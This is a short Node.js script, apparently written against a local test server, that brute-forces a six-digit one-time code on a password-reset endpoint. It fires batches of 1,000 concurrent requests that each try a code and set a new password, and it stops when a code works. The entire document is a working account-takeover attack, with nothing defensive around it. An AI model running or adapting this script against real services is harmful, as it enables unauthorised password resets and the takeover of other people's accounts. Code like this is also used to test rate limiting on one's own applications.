const axios = require('axios');

async function tryOtp(email, otp) {
    try {
        const response = await axios.post('http://localhost:3000/reset-password', {
            email: email,
            otp: otp,
            newPassword: 'newPassword123'
        });
        console.log(`Success with OTP: ${otp}`, response.data);
        return true; 
    } catch (error) {
        return false; 
    }
}

async function bruteForceOtp(email, concurrency = 1000) {
    console.time("Time to find OTP");  

    let otp = 100000;
    const maxOtp = 999999;

    const sendRequests = async () => {
        const batch = [];
        for (let i = 0; i < concurrency && otp <= maxOtp; i++, otp++) {
            batch.push(tryOtp(email, otp.toString()));
        }
        return Promise.all(batch);
    };

    let results = [];
    while (otp <= maxOtp) {
        const newResults = await sendRequests();
        results = results.concat(newResults);

        if (newResults.some(isSuccess => isSuccess)) {
            console.log('Correct OTP found, stopping further attempts.');
            console.timeEnd("Time to find OTP");  
            break;
        }
    }

    if (otp > maxOtp) {
        console.timeEnd("Time to find OTP");  
        console.log("No correct OTP found.");
    }
}

bruteForceOtp('test@example.com');
